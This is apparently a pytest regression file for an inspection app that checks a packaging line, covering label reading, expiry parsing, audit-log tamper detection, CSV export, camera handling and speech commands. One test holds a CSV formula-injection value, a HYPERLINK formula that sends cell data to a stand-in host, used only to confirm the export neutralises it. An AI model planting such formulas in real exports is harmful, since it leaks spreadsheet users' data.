"""Regression tests for the review issues fixed on fix/review-b (one small test per issue)."""

import datetime as dt
import json
import re
from pathlib import Path

import pytest

STATIC = Path(__file__).resolve().parent.parent / "trova" / "static"


def _unreachable(monkeypatch, g):
    """Grok client whose network is down (xAI unreachable): answers come from the local stand-in, marked offline."""
    import requests

    from trova import grok as grok_mod

    def down(*a, **k):
        raise requests.ConnectionError("no route to host")
    monkeypatch.setattr(g.session, "post", down)
    monkeypatch.setattr(grok_mod.time, "sleep", lambda s: None)
    return g


# ---------------------------------------------------------------- labels (#7, #10, #30) and records (#31, #54)
def test_offline_or_skipped_labels_are_not_clear(monkeypatch):                # 7
    from trova.grok import GrokClient, register_mock
    from trova.labels import _mock_labels, read_labels
    from trova.proposals import find_blobs
    from trova.synthetic import SyntheticTable
    t = SyntheticTable(seed=11, n_objects=4)                     # cartons with printed lots only (no codes)
    f, boxes = t.render(), find_blobs(t.render(), t.empty())
    r = read_labels(_unreachable(monkeypatch, GrokClient("xai-test", offline_fallback=True)), f, boxes, lot="A123")
    assert r.offline and not r.as_dict()["ok"] and {p["kind"] for p in r.problems} == {"not_read"}
    register_mock("trova_labels", lambda p, i, ctx: {"items": []})   # Grok answers but skips every box
    try:
        r = read_labels(GrokClient(mock=True), f, boxes, lot="A123")
    finally:
        register_mock("trova_labels", _mock_labels)
    assert len(r.problems) == len(boxes) and all(p["kind"] == "not_read" for p in r.problems)


def test_expiry_prefers_the_code_and_unreadable_expiry_is_not_clear():        # 10
    from trova.grok import GrokClient, register_mock
    from trova.labels import _mock_labels, check_batch, read_labels
    from trova.proposals import find_blobs
    from trova.synthetic import SyntheticTable
    t = SyntheticTable(seed=11, n_objects=2)
    t.add_labelled("LOT A123 EXP 2025-01")                       # the demo sheet's expired carton
    f = t.render()
    boxes = find_blobs(f, t.empty())
    register_mock("trova_labels", lambda p, i, ctx: {"items": [
        {"box_id": b.id, "has_label": True, "text": "", "product": "", "lot": "A123", "expiry": "2025-0?"}
        for b in ctx["boxes"]]})
    try:
        r = read_labels(GrokClient(mock=True), f, boxes, lot="A123", today=dt.date(2026, 11, 5))
    finally:
        register_mock("trova_labels", _mock_labels)
    kinds = [p["kind"] for p in r.problems]
    assert "expired" in kinds                                    # the code's 2025-01 wins over the print's '2025-0?'
    item = {"box_id": 1, "lot": "A123", "code_lot": "", "print_lot": "A123"}
    for exp in ("JUN 2025", "2025-0?", "06 2025"):
        assert [p["kind"] for p in check_batch([item | {"expiry": exp}], "A123", dt.date(2026, 11, 5))] == ["unreadable_expiry"]


def test_code_expiry_keeps_four_digit_years():                                # 30
    from trova.labels import parse_date, parse_expiry_text
    assert parse_expiry_text("LOT A123 EXP 06/2027") == "06/2027"
    assert parse_date(parse_expiry_text("LOT A123 EXP 12.2027")) == dt.date(2027, 12, 31)
    assert parse_expiry_text("LOT A1 EXP 2027-06-30") == "2027-06-30" and parse_expiry_text("Scad. 30/06/27") == "30/06/27"


def test_offline_check_is_marked_offline_in_result_and_records(tmp_path, monkeypatch):   # 31
    from test_pipeline import _client
    app, c = _client(tmp_path, monkeypatch, mock="0", XAI_API_KEY="xai-test")
    st = app.state.trova
    _unreachable(monkeypatch, st.grok)
    c.post("/api/background", data={"mode": "capture"})
    c.post("/api/reference", data={"describe": "false"})
    st.source.table.tamper("add")
    d = c.post("/api/changes").json()
    r = d["result"]
    assert d["offline"] and r["offline"] and not r["line_clear"] and r["summary"].startswith("OFFLINE")
    assert all(ch["verified"] is None for ch in r["changes"])
    assert "OFFLINE: Grok was unreachable" in c.get("/api/report").text
    assert c.get("/api/report.pdf").status_code == 200


def test_pdf_record_with_markup_in_the_lot(tmp_path):                          # 54
    from trova.record_pdf import build
    check = {"event_id": "e1", "time": "t", "model": "m", "ref_marked": "x.jpg", "cur_marked": "y.jpg",
             "result": {"line_clear": False, "summary": "", "changes": [], "filtered": [],
                        "batch": {"lot": "A<B", "items": [], "problems": []}}}
    assert build(check, tmp_path)[:4] == b"%PDF"


# ---------------------------------------------------------------- audit log (#13, #14, #33)
def test_audit_verify_after_ten_named_objects(tmp_path):                       # 13
    from trova.audit import AuditLog
    a = AuditLog(tmp_path)
    a.event("reference", n_objects=12, names={i: f"object {i}" for i in range(1, 13)})
    a.event("signoff", operator="Ana", decision="approve")
    assert a.verify()["ok"]


def test_audit_anchor_detects_tail_deletion_stripped_hashes_and_prepends(tmp_path):   # 14
    from trova.audit import AuditLog

    def fresh(name):
        a = AuditLog(tmp_path / name)
        for k in ("reference", "change_check", "signoff", "signoff"):
            a.event(k, decision="reject")
        assert a.verify()["ok"]
        log = tmp_path / name / "events.jsonl"
        return a, log, log.read_text().splitlines()

    _, log, lines = fresh("tail")
    log.write_text("\n".join(lines[:-2]) + "\n")                # server stopped, the last 2 sign-offs deleted
    v = AuditLog(tmp_path / "tail").verify()
    assert not v["ok"] and "deleted" in v["reason"]

    _, log, lines = fresh("stripped")
    stripped = []
    for line in lines:
        e = json.loads(line)
        e.pop("hash")
        e["decision"] = "approve"
        stripped.append(json.dumps(e))
    log.write_text("\n".join(stripped) + "\n")                  # every hash removed, decisions rewritten
    assert not AuditLog(tmp_path / "stripped").verify()["ok"]

    a, log, lines = fresh("prepend")
    log.write_text(json.dumps({"id": "x", "kind": "signoff", "decision": "approve"}) + "\n" + "\n".join(lines) + "\n")
    assert not a.verify()["ok"]                                  # unhashed line prepended while running
    assert not AuditLog(tmp_path / "prepend").verify()["ok"]     # and after a restart

    _, log, _ = fresh("deleted")
    log.unlink()
    assert not AuditLog(tmp_path / "deleted").verify()["ok"]     # the whole log deleted


def test_audit_torn_last_line_is_quarantined(tmp_path):                       # 33
    from trova.audit import AuditLog
    a = AuditLog(tmp_path)
    a.event("reference", n_objects=1)
    with (tmp_path / "events.jsonl").open("a") as f:
        f.write('{"id": "abc", "kind": "sig')                    # killed mid-write
    b = AuditLog(tmp_path)
    b.event("signoff", operator="Ana", decision="reject")
    assert b.all()[-1]["kind"] == "signoff" and b.verify()["ok"]
    assert '"sig' in (tmp_path / "events.partial").read_text()


# ---------------------------------------------------------------- history page (#34, #35, #53, #57)
def test_history_csv_cells_are_not_formulas():                                 # 34
    from trova.history import to_csv
    rows = [{"time": "t", "id": "1", "kind": "find", "group": "finds", "what": '=HYPERLINK("http://x/?"&A1,"open")',
             "result": "+1", "image": None}]
    cells = to_csv(rows).splitlines()[1]
    assert "'=HYPERLINK" in cells and ",'+1," in cells


def test_history_csv_link_is_not_capped():                                     # 35
    html = (STATIC / "history.html").read_text()
    href = re.search(r"\$\('csv'\)\.href = (.*);", html).group(1)
    assert "qs" not in href and "n:" not in href


def test_history_shows_operator_resets_and_lift_recoveries():                  # 53
    from trova.history import summarize
    s = summarize({"kind": "arm_lift_recovery", "operator": "staff-ana", "note": "fork freed by hand"})
    assert s["group"] == "arm" and "staff-ana" in s["result"] and "fork freed" in s["result"]
    assert summarize({"kind": "arm_reset", "operator": "staff-ana"})["group"] == "arm"
    assert summarize({"kind": "teach_pose", "name": "home_joints"})["group"] == "setup"


def test_jury_and_history_pages_have_stop():                                   # 57
    for page in ("jury.html", "history.html"):
        html = (STATIC / page).read_text()
        assert 'id="stop"' in html and "/api/arm/stop" in html
        assert "keydown" in html and "Escape" in html and "Space" in html


# ---------------------------------------------------------------- change detection (#8, #9, #29)
def _ch(kind, ref=None, cur=None):
    from trova.boxes import Box
    from trova.changes import Change
    return Change(0, kind, Box(*ref) if ref else None, Box(*cur) if cur else None)


def test_persistence_counts_every_frame_and_ignores_the_kind():                # 8
    from trova.changes import persistent_changes
    add = lambda: _ch("added", cur=(100, 100, 160, 160))         # noqa: E731
    assert [c.kind for c in persistent_changes([[add()], [add()], []])] == ["added"]
    pair = lambda: [_ch("removed", ref=(300, 300, 360, 360)), _ch("added", cur=(500, 300, 560, 360))]   # noqa: E731
    moved = _ch("moved", ref=(300, 300, 360, 360), cur=(500, 300, 560, 360))
    assert [c.kind for c in persistent_changes([pair(), pair(), [moved]])] == ["moved"]


def test_large_object_in_the_middle_is_not_dropped():                         # 9
    import cv2

    from trova import changes as chg
    from trova.grok import GrokClient, register_mock
    from trova.proposals import find_blobs
    from trova.synthetic import SyntheticTable
    t = SyntheticTable(seed=3, n_objects=0)
    ref, empty = t.render(), t.empty()
    cur = ref.copy()
    cv2.rectangle(cur, (320, 184), (960, 616), (40, 30, 20), -1)    # a binder over 27% of the view
    boxes = find_blobs(cur, empty)
    assert any(b.extra.get("oversize") for b in boxes)
    register_mock("trova_verify", lambda p, i, ctx: {"changes": [{"change_id": c.id, "is_real": False, "label": "light",
                                                                  "explanation": "a light change", "risk": "low"}
                                                                 for c in ctx["changes"]], "line_clear": True, "summary": ""})
    try:
        res = chg.check(GrokClient(mock=True), ref, find_blobs(ref, empty), [cur] * 3, [boxes] * 3)
    finally:
        register_mock("trova_verify", chg._mock_verify)
    assert not res.line_clear and res.changes[0].kind == "added"   # Grok cannot close it as a false alarm


def test_view_blocked_for_good_is_not_clear_and_alarms(tmp_path, monkeypatch):   # 29
    from test_pipeline import _client
    app, c = _client(tmp_path, monkeypatch)
    st = app.state.trova
    c.post("/api/background", data={"mode": "capture"})
    c.post("/api/reference", data={"describe": "false"})
    st.source.hand = True                                        # stands for a carton pushed against the edge
    r = c.post("/api/changes")
    assert r.status_code == 200 and not r.json()["result"]["line_clear"] and "blocked" in r.json()["result"]["summary"]
    w = st.watch
    w.blocked_s = 0
    w.step()
    assert w.alert and "view blocked" in w.alert["summary"]
    w.ack("Ana")
    w.step()
    assert w.alert is None and "acknowledged" in w.status


# ---------------------------------------------------------------- zones and watch (#26, #27, #28)
def test_allowed_zone_matches_whole_words_and_single_objects():               # 26
    from trova.zones import _allowed
    assert _allowed("blue blister pack", ["blister pack"]) and _allowed("blister packs", ["blister pack"])
    assert not _allowed("leaflet and blister pack", ["blister pack"])
    assert not _allowed("pen", ["pencil sharpener"]) and not _allowed("pencil sharpener", ["pen"])
    assert not _allowed("cap", ["capsule blister"]) and not _allowed("", ["blister pack"])


def test_empty_zone_flags_objects_partly_inside():                             # 27
    from trova.boxes import Box
    from trova.zones import Zone, evaluate
    z = Zone(name="line", polygon=[[0, 0], [100, 0], [100, 100], [0, 100]], rule="empty")
    assert not evaluate([z], [Box(55, 10, 155, 50, id=1)])[0]["ok"]
    assert evaluate([z], [Box(103, 10, 200, 50, id=1)])[0]["ok"]


def test_watch_situation_survives_jitter_and_renumbering():                    # 28
    from trova.watch import _same_situation, _signature
    a = _signature([_ch("added", cur=(589.6, 300, 649.6, 360))], [])
    b = _signature([_ch("added", cur=(590.6, 300, 650.6, 360))], [])
    assert _same_situation(a, b)                                 # 1 px across the old 40 px grid line
    z1 = [{"name": "line", "ok": False, "objects": [{"id": 3, "name": "object 3", "box": [10, 10, 60, 60]}]}]
    z2 = [{"name": "line", "ok": False, "objects": [{"id": 4, "name": "object 4", "box": [12, 10, 62, 60]}]}]
    assert _same_situation(_signature([], z1), _signature([], z2))
    gone = _signature([_ch("removed", ref=(589.6, 300, 649.6, 360))], [])
    assert not _same_situation(gone, a)                          # something else at that place is new


# ---------------------------------------------------------------- Grok boxes (#25), dog route (#58)
def test_direct_box_outside_the_picture_is_refused():                         # 25
    import numpy as np

    from trova import finder
    from trova.grok import GrokClient, register_mock
    frame = np.zeros((800, 1280, 3), np.uint8)
    try:
        for bad in ([1300, 100, 1400, 200], [-400, -300, -300, -200], [500, 500, 400, 600], [1, 2, 3]):
            register_mock("trova_direct", lambda p, i, ctx, bad=bad: {"found": True, "box_2d": bad, "label": "pen",
                                                                      "reason": "", "confidence": 0.9})
            r = finder.find(GrokClient(mock=True), frame, [], "the pen")       # no boxes: direct fallback
            assert r.status != "found" and r.box is None, bad
        register_mock("trova_direct", lambda p, i, ctx: {"found": True, "box_2d": [100, 100, 200, 200], "label": "pen",
                                                         "reason": "", "confidence": 0.9})
        assert finder.find(GrokClient(mock=True), frame, [], "the pen").status == "found"
    finally:
        register_mock("trova_direct", finder._mock_direct)


def test_dog_route_one_sorted_list_any_case(tmp_path):                         # 58
    from trova.dog import load_route
    folder = tmp_path / "dog_route"
    folder.mkdir()
    for n in ("01_desk.png", "02_shelf.jpg", "03_bench.JPG", "04_hall.jpeg", "notes.txt"):
        (folder / n).write_bytes(b"x")
    assert [s.name for s in load_route(tmp_path)] == ["desk", "shelf", "bench", "hall"]


# ---------------------------------------------------------------- camera (#51, #52)
class _FakeCap:
    """A capture whose read() can block like a stalled stream; records sets and whether release ran mid-read."""
    instances: list = []

    def __init__(self, src, *a):
        import threading
        self.sets, self.reading, self.released, self.released_mid_read = [], False, False, False
        self.gate = threading.Event()
        self.mode = "frames"
        _FakeCap.instances.append(self)

    def isOpened(self):
        return True

    def set(self, prop, value):
        self.sets.append((prop, value))
        return True

    def read(self):
        import numpy as np
        if self.mode == "frames":
            return True, np.zeros((720, 1280, 3), np.uint8)
        if self.mode == "nothing":
            return False, None
        self.reading = True                    # "stall": blocked until the test lets it go
        self.gate.wait(5)
        self.reading = False
        return False, None

    def release(self):
        self.released = True
        self.released_mid_read = self.released_mid_read or self.reading


def test_stalled_stream_close_and_failed_open_do_not_leak(monkeypatch):        # 51
    import time

    import trova.camera as cam_mod
    monkeypatch.setattr(cam_mod.cv2, "VideoCapture", _FakeCap)
    monkeypatch.setattr(cam_mod.WebcamSource, "JOIN_S", 0.2, raising=False)
    monkeypatch.setattr(cam_mod.WebcamSource, "FIRST_FRAME_S", 0.3, raising=False)
    _FakeCap.instances = []
    src = cam_mod.WebcamSource("http://trova-cam.local:8080/stream.mjpg")
    cap = _FakeCap.instances[-1]
    cap.mode = "stall"
    time.sleep(0.1)
    src.close()                                                  # the reader is stuck inside cap.read()
    assert not cap.released_mid_read
    cap.gate.set()
    src._thread.join(2)
    assert cap.released and not cap.released_mid_read          # released by the reader once it got out

    monkeypatch.setattr(_FakeCap, "read", lambda self: (False, None))
    with pytest.raises(RuntimeError, match="sent no frames"):
        cam_mod.WebcamSource("http://trova-cam.local:8080/stream.mjpg")
    time.sleep(0.3)
    import threading
    assert not any(t.name != "MainThread" and "_loop" in str(getattr(t, "_target", "")) for t in threading.enumerate())
    assert _FakeCap.instances[-1].released


def test_webcam_reopen_keeps_the_requested_size(monkeypatch):                  # 52
    import cv2

    import trova.camera as cam_mod
    monkeypatch.setattr(cam_mod.cv2, "VideoCapture", _FakeCap)
    monkeypatch.setattr(cam_mod.time, "sleep", lambda s: None)
    _FakeCap.instances = []
    src = cam_mod.WebcamSource(0, 1920, 1080)
    try:
        src._reopen()
        assert {(cv2.CAP_PROP_FRAME_WIDTH, 1920), (cv2.CAP_PROP_FRAME_HEIGHT, 1080)} <= set(_FakeCap.instances[-1].sets)
        assert len(_FakeCap.instances) == 2
    finally:
        src._run = False


# ---------------------------------------------------------------- browser speech (#36, #56)
def _node(js: str, *args: str) -> object:
    import shutil
    import subprocess
    node = shutil.which("node")
    if not node:
        pytest.skip("node not installed")
    return json.loads(subprocess.run([node, "-e", js, str(STATIC / "speech.js"), *args],
                                     capture_output=True, text=True, check=True).stdout)


def test_push_to_talk_stop_watching_reaches_the_final_handler():              # 36
    from trova.voice import STOP_WORDS
    js = """const S = require(process.argv[1]); const sw = JSON.parse(process.argv[2]); let rec;
global.window = {SpeechRecognition: function () { rec = this; this.start = () => {}; }};
const say = (said) => said.forEach(([t, fin]) => { const r = [{transcript: t}]; r.isFinal = fin; rec.onresult({results: [r]}); });
const run = (said) => { const out = []; S.listen({lang: 'en-US', stopWords: sw, onInterim: () => {}, onEnd: () => {},
  onStop: t => out.push(['stop', t]), onFinal: t => out.push(['final', t])}); say(said); return out; };
console.log(JSON.stringify([run([['stop', false], ['stop watching', true]]), run([['stop', false], ['shop the pens', true]])]));"""
    watching, misheard = _node(js, json.dumps(STOP_WORDS))
    assert ["stop", "stop"] in watching and ["final", "stop watching"] in watching
    assert misheard == [["stop", "stop"]]                        # a revised transcript never runs a find after STOP


def test_speech_parser_knows_the_documented_commands():                        # 56
    from trova.voice import STOP_WORDS
    said = ["torna a casa", "park", "go home", "is the line clear?", "controlla la linea", "la linea è libera?"]
    js = ("const S = require(process.argv[1]); const [said, sw] = JSON.parse(process.argv[2]);"
          "console.log(JSON.stringify(said.map(t => S.parse(t, sw).cmd)));")
    assert _node(js, json.dumps([said, STOP_WORDS])) == ["home", "home", "home", "check", "check", "check"]


# ---------------------------------------------------------------- docs (#59, #60)
ROOT = STATIC.parent.parent


def test_env_example_lists_every_setting_the_code_reads():                    # 59
    read = set()
    for p in (ROOT / "trova").rglob("*.py"):
        read |= set(re.findall(r"""getenv\(\s*["'](TROVA_[A-Z0-9_]+)["']""", p.read_text()))
    listed = set(re.findall(r"^(TROVA_[A-Z0-9_]+)=", (ROOT / ".env.example").read_text(), re.M))
    assert {"TROVA_OPERATOR_NAME", "TROVA_OPERATOR_TOKEN", "TROVA_HOST", "TROVA_DATA"} <= read
    assert read - listed == set()


def test_readme_arm_camera_is_the_pi_stream():                                 # 60
    line = next(x for x in (ROOT / "README.md").read_text().splitlines() if x.startswith("- **Camera on the arm**"))
    assert "TROVA_CAMERA=http://trova-cam.local:8080/stream.mjpg" in line and "TROVA_CAMERA=<index>" not in line
